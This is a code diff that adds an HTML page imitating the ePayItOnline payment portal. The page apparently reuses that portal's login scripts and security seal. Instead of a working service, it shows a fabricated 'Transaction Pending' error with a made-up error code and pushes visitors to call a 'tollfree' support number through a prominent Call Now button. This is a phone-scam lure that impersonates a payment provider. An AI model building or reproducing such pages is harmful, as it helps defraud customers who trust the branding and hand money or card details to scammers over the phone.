@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+
+<script
+  type="text/javascript"
+  src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+  integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+  crossorigin="anonymous"
+  type="text/javascript"
+></script>
+
+<script type="text/javascript">
+  var PAPAYA_PAYEE_NAME = "ePayItOnline";
+</script>
+
+<html>
+  <head>
+    <title>ePayItOnline</title>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <meta name="referrer" content="no-referrer" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" type="text/css" href="css/styles.css" />
+    <link rel="stylesheet" type="text/css" href="css/modal.css" />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      media="(max-width: 1024px)"
+      href="css/mobile.css"
+    />
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-TFDNLEE4PR"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-TFDNLEE4PR");
+    </script>
+    <style>
+      .btn {
+        background-color: #002546;
+        border-radius: 5px;
+        color: white;
+        font-size: 14px;
+        border: 1px solid #002546;
+      }
+      .btn:hover {
+        background-color: #002546;
+        border-radius: 5px;
+        color: white;
+        font-size: 14px;
+        border: 1px solid #002546;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="stx_page-wrapper">
+      <header>
+        &nbsp;
+        <nav></nav>
+      </header>
+      <main class="flex">
+        <form action="checkout.html" method="GET">
+          <section id="dma-welcome">
+            <img
+              src="images/logo-epayitonline@2x.png"
+              id="loginCtrl_imgClientLogo"
+            />
+            <div id="loginCtrl_divAccessLoginBody">
+              <div id="loginCtrl_divAccessLoginHeader">
+                <img
+                  src="https://cdn.pixabay.com/animation/2023/08/11/21/18/21-18-05-265_512.gif"
+                  alt=""
+                  style="width: 50px; height: 50px; margin-top: 30px"
+                />
+                <h1>!Oops. Transaction Pending...</h1>
+                <p>
+                  <strong>ErrorCode (EPAY-10X2300)</strong>
+                </p>
+              </div>
+              <section
+                id="dma-view-bill"
+                style="
+                  display: flex;
+                  flex-direction: column;
+                  justify-content: center;
+                  align-items: center;
+                "
+              >
+                <h4 style="text-align: center">
+                  Transaction is on hold. Please check status of your payment.
+                </h4>
+                <h4>Call our support now- tollfree +1 863-949-0445</h4>
+              </section>
+              <span
+                id="loginCtrl_errMsg"
+                style="color: Red; font-weight: bold"
+              ></span>
+            </div>
+
+            <section id="dma-code-help">
+              <!-- <p>
+                <a
+                  id="stx_help"
+                  style="
+                    color: #001eb0;
+                    font-weight: 600;
+                    text-decoration: underline;
+                  "
+                  >Need help finding the Code ID and Access #?</a
+                >
+              </p> -->
+
+              <a href="tel:+1 8639490445" class="btn"
+                ><i class="fa fa-phone" aria-hidden="true"></i> Call Now</a
+              >
+            </section>
+          </section>
+
+          <script type="text/javascript">
+            "use strict";
+
+            window.onunload = function () {
+              console.log("");
+            };
+
+            var job = document.getElementById("loginCtrl_txtJobNumber");
+            if (job != null) {
+              job.value = "";
+            }
+
+            var file = document.getElementById("loginCtrl_txtFileNumber");
+            if (file != null) {
+              file.value = "";
+            }
+
+            var statement = document.getElementById(
+              "loginCtrl_txtStatementNumber"
+            );
+            if (job != null) {
+              statement.value = "";
+            }
+
+            function fillLogin(code) {
+              code = code.toUpperCase();
+
+              if (code == "DEMO") {
+                document.getElementById("loginCtrl_txtJobNumber").value =
+                  "1159103";
+                document.getElementById("loginCtrl_txtFileNumber").value = "1";
+                document.getElementById("loginCtrl_txtStatementNumber").value =
+                  "2";
+              } else if (code == "MPDEMO") {
+                document.getElementById("loginCtrl_txtJobNumber").value =
+                  "1159107";
+                document.getElementById("loginCtrl_txtFileNumber").value = "1";
+                document.getElementById("loginCtrl_txtStatementNumber").value =
+                  "2";
+              } else if (code == "DEMOISALUS") {
+                document.getElementById("loginCtrl_txtJobNumber").value =
+                  "10671939";
+                document.getElementById("loginCtrl_txtFileNumber").value = "1";
+                document.getElementById("loginCtrl_txtStatementNumber").value =
+                  "1";
+              } else {
+                // switch storeIds for
+              }
+
+              return code;
+            }
+
+            function fillTextfields(code) {
+              document.getElementById("selCreditCard").value = "02";
+              document.getElementById("txtCreditCardNumber").value =
+                "4111-1111-1111-1111";
+              document.getElementById("selExpMonth").value = "07";
+              document.getElementById("selExpYear").value = "2008";
+              document.getElementById("txtPIN").value = "399";
+              document.getElementById("txtName").value = "John Smith";
+              document.getElementById("txtStreetAddress").value =
+                "123 AnyStreet Ave";
+              document.getElementById("txtCity").value = "Somewhere";
+              document.getElementById("selState").value = "GA";
+              document.getElementById("txtZip").value = "30004";
+              document.getElementById("txtEmailAddress").value =
+                "customer@adomain.com";
+              return code;
+            }
+
+            function limitToFifty(code) {
+              code = code.substring(0, 50);
+              return code;
+            }
+
+            function formatDouble(num) {
+              num = num.toString().replace(/\$|\,/g, "");
+              if (isNaN(num)) num = "0";
+              sign = num == (num = Math.abs(num));
+              num = Math.floor(num * 100 + 0.50000000001);
+              cents = num % 100;
+              num = Math.floor(num / 100).toString();
+              if (cents < 10) cents = "0" + cents;
+              for (var i = 0; i < Math.floor((num.length - (1 + i)) / 3); i++)
+                num =
+                  num.substring(0, num.length - (4 * i + 3)) +
+                  "," +
+                  num.substring(num.length - (4 * i + 3));
+              return (sign ? "" : "-") + num + "." + cents;
+            }
+
+            function formatCurrency(num) {
+              num = num.toString().replace(/\$|\,/g, "");
+              if (isNaN(num)) num = "0";
+              sign = num == (num = Math.abs(num));
+              num = Math.floor(num * 100 + 0.50000000001);
+              cents = num % 100;
+              num = Math.floor(num / 100).toString();
+              if (cents < 10) cents = "0" + cents;
+              for (var i = 0; i < Math.floor((num.length - (1 + i)) / 3); i++)
+                num =
+                  num.substring(0, num.length - (4 * i + 3)) +
+                  "," +
+                  num.substring(num.length - (4 * i + 3));
+              return (sign ? "" : "-") + "$" + num + "." + cents;
+            }
+
+            function MM_swapImgRestore() {
+              //v3.0
+              var i,
+                x,
+                a = document.MM_sr;
+              for (i = 0; a && i < a.length && (x = a[i]) && x.oSrc; i++)
+                x.src = x.oSrc;
+            }
+
+            function MM_preloadImages() {
+              //v3.0
+              var d = document;
+              if (d.images) {
+                if (!d.MM_p) d.MM_p = new Array();
+                var i,
+                  j = d.MM_p.length,
+                  a = MM_preloadImages.arguments;
+                for (i = 0; i < a.length; i++)
+                  if (a[i].indexOf("#") != 0) {
+                    d.MM_p[j] = new Image();
+                    d.MM_p[j++].src = a[i];
+                  }
+              }
+            }
+
+            function MM_findObj(n, d) {
+              //v4.01
+              var p, i, x;
+              if (!d) d = document;
+              if ((p = n.indexOf("?")) > 0 && parent.frames.length) {
+                d = parent.frames[n.substring(p + 1)].document;
+                n = n.substring(0, p);
+              }
+              if (!(x = d[n]) && d.all) x = d.all[n];
+              for (i = 0; !x && i < d.forms.length; i++) x = d.forms[i][n];
+              for (i = 0; !x && d.layers && i < d.layers.length; i++)
+                x = MM_findObj(n, d.layers[i].document);
+              if (!x && d.getElementById) x = d.getElementById(n);
+              return x;
+            }
+
+            function MM_swapImage() {
+              //v3.0
+              var i,
+                j = 0,
+                x,
+                a = MM_swapImage.arguments;
+              document.MM_sr = new Array();
+              for (i = 0; i < a.length - 2; i += 3)
+                if ((x = MM_findObj(a[i])) != null) {
+                  document.MM_sr[j++] = x;
+                  if (!x.oSrc) x.oSrc = x.src;
+                  x.src = a[i + 2];
+                }
+            }
+
+            function ValidateComments(sender, args) {
+              if (args.Value.length > 10) args.IsValid = false;
+              else args.IsValid = true;
+            }
+            //-->
+          </script>
+
+          <script type="text/javascript">
+            $(document).ready(function () {
+              function BindSubmit(textbox, button) {
+                $(textbox)
+                  .unbind()
+                  .keypress(function (event) {
+                    var keyCode = event.keyCode
+                      ? event.keyCode
+                      : event.which
+                      ? event.which
+                      : event.charCode;
+                    if (keyCode == 13) {
+                      $(button).trigger("tap");
+                    }
+                  });
+              }
+            });
+
+            $(function () {
+              $("body").keypress(function (e) {
+                if (e.which == 13) {
+                  e.preventDefault();
+                  $("#loginCtrl_btnContinue").click();
+                }
+              });
+            });
+
+            //called when key is pressed in textbox
+            $("#loginCtrl_txtJobNumber").keypress(function (e) {
+              //if the letter is not digit then display error and don't type anything
+              if (
+                e.which != 8 &&
+                e.which != 0 &&
+                e.which != 13 &&
+                e.which != 45 &&
+                (e.which < 48 || e.which > 57)
+              ) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Numerals Only")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              } else if (e.which == 45) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Do not add dashes to Access# boxes!")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              }
+            });
+            $("#loginCtrl_txtFileNumber").keypress(function (e) {
+              //if the letter is not digit then display error and don't type anything
+              if (
+                e.which != 8 &&
+                e.which != 0 &&
+                e.which != 13 &&
+                e.which != 45 &&
+                (e.which < 48 || e.which > 57)
+              ) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Numerals Only")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              } else if (e.which == 45) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Do not add dashes to Access# boxes!")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              }
+            });
+            $("#loginCtrl_txtStatementNumber").keypress(function (e) {
+              //if the letter is not digit then display error and don't type anything
+              //if the letter is not digit then display error and don't type anything
+              if (
+                e.which != 8 &&
+                e.which != 0 &&
+                e.which != 13 &&
+                e.which != 45 &&
+                (e.which < 48 || e.which > 57)
+              ) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Numerals Only")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              } else if (e.which == 45) {
+                //display error message
+                $("#loginCtrl_errMsg")
+                  .html("Do not add dashes to Access# boxes!")
+                  .show()
+                  .fadeOut(4000);
+                return false;
+              }
+            });
+            $(function () {
+              $('[data-toggle="popover"]').popover();
+            });
+          </script>
+
+          <div class="row centered-form">
+            <div class="">
+              <div class="row">
+                <div class="text-center">
+                  <div id="DigiCertClickID_TIN8lWCK"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <!-- NOACCESS MODAL CONTENT -->
+          <div
+            id="stx_modal-dialog-no-access"
+            class="stx_modal-dialog-no-access stx_hidden stx_visually-hidden"
+          >
+            <div class="stx_modal-content">
+              <span
+                id="stx_modal-close-no-access"
+                class="stx_modal-close-no-access"
+                >&times;</span
+              >
+              <img
+                src="Images/logo-epayitonline@2x.png"
+                alt=""
+                class="dma_modal-logo"
+              />
+              <h4 id="noAccessNumberLoginCtrl_hTile">
+                Please enter the following.
+              </h4>
+
+              <div class="text-center">
+                <div
+                  id="noAccessNumberLoginCtrl_noAccess"
+                  style="color: Red; display: none"
+                ></div>
+                <span
+                  id="noAccessNumberLoginCtrl_errMsg"
+                  style="color: Red; font-weight: bold"
+                ></span>
+              </div>
+              <div class="form-group">
+                <input
+                  type="submit"
+                  name="noAccessNumberLoginCtrl$btnSubmit"
+                  value="Submit"
+                  id="noAccessNumberLoginCtrl_btnSubmit"
+                  class="spinner"
+                />
+              </div>
+
+              <p>
+                <input
+                  type="button"
+                  value="Close this Window"
+                  id="stx_modal-close2-no-access"
+                />
+              </p>
+            </div>
+          </div>
+          <!-- END NOACCESS MODAL CONTENT -->
+
+          <script type="text/javascript">
+            //<![CDATA[
+            var Page_ValidationSummaries = new Array(
+              document.getElementById("noAccessNumberLoginCtrl_noAccess")
+            );
+            //]]>
+          </script>
+
+          <script type="text/javascript">
+            //<![CDATA[
+            var noAccessNumberLoginCtrl_noAccess = document.all
+              ? document.all["noAccessNumberLoginCtrl_noAccess"]
+              : document.getElementById("noAccessNumberLoginCtrl_noAccess");
+            noAccessNumberLoginCtrl_noAccess.headertext =
+              "You must enter a value in the following fields:";
+            noAccessNumberLoginCtrl_noAccess.validationGroup = "NoAccessGroup";
+            //]]>
+          </script>
+
+          <script type="text/javascript">
+            //<![CDATA[
+
+            theForm.oldSubmit = theForm.submit;
+            theForm.submit = WebForm_SaveScrollPositionSubmit;
+
+            theForm.oldOnSubmit = theForm.onsubmit;
+            theForm.onsubmit = WebForm_SaveScrollPositionOnSubmit;
+            WebForm_AutoFocus("loginCtrl_txtClientCode"); //]]>
+          </script>
+        </form>
+      </main>
+      <footer style="display: flex">
+        <div id="dma_footer-nav">
+          <div>
+            <div>
+              <a
+                href="~/PrivacyPolicy.aspx"
+                class="btn btn-link nav-link px-2 text-muted"
+                target="_privacy"
+                onclick="window.open(this.href, 'mywin','left=20,top=20,width=770,height=500,toolbar=1,resizable=0'); return false;"
+                >Privacy Statement</a
+              >
+            </div>
+          </div>
+        </div>
+        <img src="Images/logo-dma-footer.svg" />
+      </footer>
+    </div>
+    <!-- MODAL CONTENT -->
+    <div
+      id="stx_modal-dialog"
+      class="stx_modal-dialog stx_hidden stx_visually-hidden"
+    >
+      <div class="stx_modal-content">
+        <span id="stx_modal-close" class="stx_modal-close">&times;</span>
+        <img
+          src="Images/logo-epayitonline@2x.png"
+          alt=""
+          class="dma_modal-logo"
+        />
+        <h1>Finding your Code ID and Access #</h1>
+        <p>
+          The <strong>Code ID</strong> and <strong>Access #</strong> are located
+          on your Statement at a location similar to the image below.
+        </p>
+        <p>
+          <img src="Images/find-code@2x.png" alt="" id="dma_thumbnail" />
+        </p>
+        <p>
+          <input
+            type="button"
+            value="Close this Window"
+            id="stx_modal-close2"
+          />
+        </p>
+      </div>
+    </div>
+    <!-- END MODAL CONTENT -->
+    <script type="text/javascript">
+      var body = document.getElementsByTagName("body");
+      var pageWrapper = document.getElementById("stx_page-wrapper");
+      var modal_noaccess = document.getElementById(
+        "stx_modal-dialog-no-access"
+      );
+      var btnOpen_noaccess = document.getElementById("stx_no-access");
+      var btnClose_noaccess = document.getElementById(
+        "stx_modal-close-no-access"
+      );
+      var btnClose2_noaccess = document.getElementById(
+        "stx_modal-close2-no-access"
+      );
+
+      // Open the modal
+      btnOpen_noaccess.onclick = function () {
+        modal_noaccess.className =
+          "stx_modal-dialog-no-access stx_visually-hidden";
+        setTimeout(function () {
+          pageWrapper.className = "";
+          modal_noaccess.className = "stx_modal-dialog-no-access";
+        }, 100);
+        console.log(modal_noaccess);
+      };
+
+      // Close the modal
+      btnClose_noaccess.onclick = function () {
+        modal_noaccess.className =
+          "stx_modal-dialog-no-access stx_hidden stx_visually-hidden";
+        body.className = "stx_background-login";
+        pageWrapper.className = "";
+        pageWrapper.parentElement.className = "stx_background-login";
+      };
+      btnClose2_noaccess.onclick = function () {
+        modal_noaccess.className =
+          "stx_modal-dialog-no-access stx_hidden stx_visually-hidden";
+        body.className = "stx_background-login";
+        pageWrapper.className = "";
+        pageWrapper.parentElement.className = "stx_background-login";
+      };
+      // When the user clicks anywhere outside of the modal, close it
+      window.onclick = function (event) {
+        if (event.target == modal) {
+          modal_noaccess.className = "stx_modal-dialog-no-access stx_hidden";
+          body.className = "stx_background-login";
+          pageWrapper.className = "";
+          pageWrapper.parentElement.className = "stx_background-login";
+        }
+      };
+    </script>
+    <script type="text/javascript">
+      var body = document.getElementsByTagName("body");
+      var pageWrapper = document.getElementById("stx_page-wrapper");
+      var modal = document.getElementById("stx_modal-dialog");
+      var btnOpen = document.getElementById("stx_help");
+      var btnClose = document.getElementById("stx_modal-close");
+      var btnClose2 = document.getElementById("stx_modal-close2");
+
+      // Open the modal
+      btnOpen.onclick = function () {
+        modal.className = "stx_modal-dialog stx_visually-hidden";
+        setTimeout(function () {
+          pageWrapper.className = "stx_blurred";
+          modal.className = "stx_modal-dialog";
+        }, 100);
+        console.log(modal);
+        console.log("click");
+      };
+      // Close the modal
+      btnClose.onclick = function () {
+        modal.className = "stx_modal-dialog stx_hidden stx_visually-hidden";
+        body.className = "stx_background-login";
+        pageWrapper.className = "";
+        pageWrapper.parentElement.className = "stx_background-login";
+      };
+      btnClose2.onclick = function () {
+        modal.className = "stx_modal-dialog stx_hidden stx_visually-hidden";
+        body.className = "stx_background-login";
+        pageWrapper.className = "";
+        pageWrapper.parentElement.className = "stx_background-login";
+      };
+      // When the user clicks anywhere outside of the modal, close it
+      window.onclick = function (event) {
+        if (event.target == modal) {
+          modal.className = "stx_modal-dialog stx_hidden";
+          body.className = "stx_background-login";
+          pageWrapper.className = "";
+          pageWrapper.parentElement.className = "stx_background-login";
+        }
+      };
+    </script>
+    <script type="text/javascript">
+      var __dcid = __dcid || [];
+      __dcid.push({
+        cid: "DigiCertClickID_TIN8lWCK",
+        tag: "TIN8lWCK",
+        seal_format: "dynamic",
+      });
+      (function () {
+        var cid = document.createElement("script");
+        cid.async = true;
+        cid.src = "//seal.digicert.com/seals/cascade/seal.min.js";
+        var s = document.getElementsByTagName("script");
+        var ls = s[s.length - 1];
+        ls.parentNode.insertBefore(cid, ls.nextSibling);
+      })();
+    </script>
+  </body>
+</html>
